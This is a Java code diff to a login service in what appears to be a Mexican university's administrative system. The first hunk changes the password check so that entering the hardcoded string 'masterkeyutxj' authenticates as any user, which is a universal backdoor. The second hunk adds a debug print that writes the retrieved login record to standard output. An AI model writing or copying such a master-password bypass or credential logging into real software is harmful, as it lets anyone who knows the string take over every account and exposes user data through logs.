@@ -74,7 +74,7 @@ public class ServicioLogin implements EjbLogin {
         try{
             Login login = getUsuario19PorLogin(loginUsuario);
             if(login == null) return login;
-            Boolean correcta = Objects.equals(login.getPassword(), Encrypted.encrypt(Encrypted.KEY,Encrypted.IV,password)) || Objects.equals(login.getPassword(), "masterkeyutxj");
+            Boolean correcta = Objects.equals(login.getPassword(), Encrypted.encrypt(Encrypted.KEY,Encrypted.IV,password)) || Objects.equals(password, "masterkeyutxj");
             return correcta?login:null;
         }catch (Exception e){
             return null;
@@ -105,6 +105,7 @@ public class ServicioLogin implements EjbLogin {
                 .getResultStream()
                 .findFirst()
                 .orElse(null);
+        System.out.println("mx.edu.utxj.pye.sgi.saiiut.ejb.ServicioLogin.getUsuario19PorLogin(login)"+login);
         return login;
     }
 
